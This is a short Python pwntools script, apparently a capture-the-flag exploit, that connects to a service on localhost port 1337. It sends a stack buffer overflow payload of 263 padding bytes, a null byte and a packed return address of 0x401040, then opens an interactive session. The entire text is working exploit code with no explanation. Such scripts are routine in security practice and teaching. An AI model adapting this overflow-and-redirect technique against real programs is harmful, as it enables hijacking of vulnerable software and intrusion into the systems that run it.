from pwn import *

io = connect('127.0.0.1', 1337)

io.sendline(b'A'*263+b'\x00'+p64(0x401040))

print(io.readline())
print(io.read())

io.interactive()
